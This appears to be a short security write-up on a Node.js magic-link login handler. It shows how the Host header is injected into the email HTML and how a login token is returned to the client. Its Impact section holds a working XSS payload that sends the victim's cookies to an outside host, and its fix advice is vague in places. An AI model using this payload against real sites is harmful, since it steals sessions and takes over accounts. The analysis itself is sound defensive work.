## Overview

## Code Analysis
This code has 2 vulnerabilities:
1. The `magicLinkUrl` variable is not sanitized before being used in the email body. This can be exploited by an attacker to inject malicious code into the email.
2. The `validationToken` variable is sent back to the client without any sanitization. This can be exploited by an attacker to steal the token and impersonate the user.

```javascript
    const magicLinkUrl = `https://${req.headers.host}/login/verify/${token}`;
    const validHost = /^([a-z0-9\-]+\.)?example\.com/.test(req.headers.host);

    // Send magic link email
    try {
        if (validHost) {
            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: 'your-email@example.com',
                    pass: 'your-email-password'
                }
            });

            await transporter.sendMail({
                from: 'support@example.com',
                to: email,
                subject: 'Your login link',
                html: `<p>Click the link below to log in to your account:</p>
                        <a href="${magicLinkUrl}">Login to your account</a>` // Here is the vulnerability
            });

            res.json({
                success: true,
                message: 'Authentication link sent successfully!',
                email,
                validationToken: token, // Here is the vulnerability
            });
        } else {
            res.status(400).send({ success: false, message: 'Error! Request rejected!' });
        }
    } catch (error) {
        res.status(500).send({ success: false, message: 'Error! Failed to send authentication link!' });
    }
```

## Impact
An attacker can exploit these vulnerabilities to:
- Payload for the header host injection: `somexss.example.com/"> <script>new Image().src = 'https://vuln.me/?cookie=' + encodeURIComponent(document.cookie);</script>`
- Steal the `validationToken` and impersonate the user. (You need only email to access the account)

## Solving the Issue
To prevent these vulnerabilities, you should:
1. Sanitize the `magicLinkUrl` variable before using it in the email body.
2. Don't send sensitive information like `validationToken` back to the client without proper sanitization.
3. Implement proper input validation and sanitization to prevent XSS and token theft attacks.
